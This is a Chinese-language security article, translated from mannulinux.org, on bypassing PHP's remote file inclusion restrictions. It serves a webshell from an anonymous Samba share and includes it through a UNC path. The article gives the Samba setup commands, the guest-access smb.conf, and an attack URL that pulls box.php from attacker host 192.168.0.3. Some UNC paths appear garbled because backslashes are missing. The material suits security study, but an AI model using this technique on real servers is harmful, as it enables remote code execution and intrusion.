# 使用SMB绕过PHP远程文件包含限制

阅读量 **267793**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-05-15 16:30:47

 **x**

##### 译文声明

本文是翻译文章，文章原作者 mannulinux，文章来源：mannulinux.org

原文地址：<http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01cc37da32e875222f.jpg)

## 简介

在这篇文章中，我分享一下PHP程序中的远程文件包含漏洞，它经常会在文件包含中被利用。尽管PHP环境已经配置了禁止从远程的`HTTP/FTP
URL`包含文件，但我将分享如何绕过远程文件包含的限制。

## PHP and SMB 共享文件访问权限

在PHP配置文件中，默认将`allow_url_include`设置为`Off`，来限制PHP去加载远程的HTTP/FTP文件，这也有效的防御了远程文件包含攻击。尽管`PHP`设置了`allow_url_include`和`allow_url_fopen`为`Off`,但是没有阻止下载`SMB
URL`。

## 攻击场景

当存在漏洞的PHP应用程序从攻击者控制的SMB共享机器上下载PHP
webshell时，SMB共享机器应该允许其访问该文件。攻击者应该设置SMB服务器可以匿名访问。因此，一旦存在漏洞的应用程序去从SMB共享机器上下载PHP
webshell时，SMB服务器不用判断任何身份，存在漏洞的程序就可以包含这个webshell。

让我们开始，首先在PHP的配置文件php.ini中禁止 “allow_url_fopen”
和”allow_url_include”，稍后配置SMB服务器可以匿名访问。一旦SMB共享设置好，就可以实施攻击。

## PHP 环境配置

存在漏洞的机器已经设置”allow_url_fopen”和”allow_url_include”
为`Off`,下面的截图显示当前的PHP版本为`5.5.11`。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/new/Snip20190515_31.png)

在此之前，我们要去访问远程的HTTP服务器上的webshell时，确保PHP禁止了远程文件包含。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/new/Snip20190515_32.png)

应用程序显示报错，当我从远程主机上测试包含PHP webshell时，远程文件包含没成功。

## 配置 SAMBA 服务器为匿名访问

使用以下命令去安装SAMBA服务器。

`apt-get install samba`

创建SMB 共享目录 （比如我的 /var/www/html/pub/）

`mkdir /var/www/html/pub/`

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/new/Snip20190515_33.png)

配置新创建的SMB共享目录的权限：

    
    
     chmod 0555 /var/www/html/pub/
     chown -R nobody:nogroup /var/www/html/pub/
    

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/new/Snip20190515_34.png)

运行下面的命令来删除SAMBA 服务器的配置文件内容。

`echo > /etc/samba/smb.conf`

把下面的内容写在`/etc/samba/smb.conf`里面。

    
    
    [global]
    workgroup = WORKGROUP
    server string = Samba Server %v
    netbios name = indishell-lab
    security = user
    map to guest = bad user
    name resolve order = bcast host
    dns proxy = no
    bind interfaces only = yes
    
    [ica]
    path = /var/www/html/pub
    writable = no
    guest ok = yes
    guest only = yes
    read only = yes
    directory mode = 0555
    force user = nobody
    

重启SAMBA服务器，让配置文件 `/etc/samba/smb.conf`生效。

一旦SAMBA 服务器重启成功，尝试去访问SMB共享文件，确认SAMBA
服务器没有设置访问权限。在我的测试中，SAMBA服务器的IP是`192.168.0.3`，在Windows 文件浏览中去访问SMB共享文件，如下图。

`\192.168.0.3`

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/new/Snip20190515_35.png)

## 在SMB共享中放置PHP webshell

真棒。SMB共享目录是可以访问的，`ica`文件是存在的。

在目录`/var/www/html/pub`中放置php webshell，这是SMB共享指令`ica`目录。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/new/Snip20190515_36.png)

一旦在SMB共享目录中放置了PHP shell，使用windows 文件浏览访问SMB的共享目录`ica`.

`\192.168.0.3ica`

你会看到PHP shell在SMB 共享目录里面。我的是box.php

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/new/Snip20190515_37.png)

## 文件包含攻击

使用存在远程文件包含的PHP应用程序去访问这个SMB共享PHP shell的链接。

`http://vulnerable_application/page.php？page=\192.168.0.3icabox.php`

可以看到，存在PHP文件包含的应用程序从SMB’共享文件中获取web
shell，并在机器上执行。我们已经绕过了限制并包含了托管在远程机器上的webshell。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/new/Snip20190515_38.png)

本文翻译自mannulinux.org [原文链接](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **爱吃猫的鱼** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/178281](/post/id/178281)

安全客 - 有思想的安全新媒体

本文转载自: [mannulinux.org](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)

如若转载,请注明出处： <http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [smb](/tag/smb)
  * [RFI](/tag/RFI)

 **+1** __18赞

 __收藏

![](https://p1.ssl.qhimg.com/t010857340ce46bb672.jpg) 爱吃猫的鱼

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

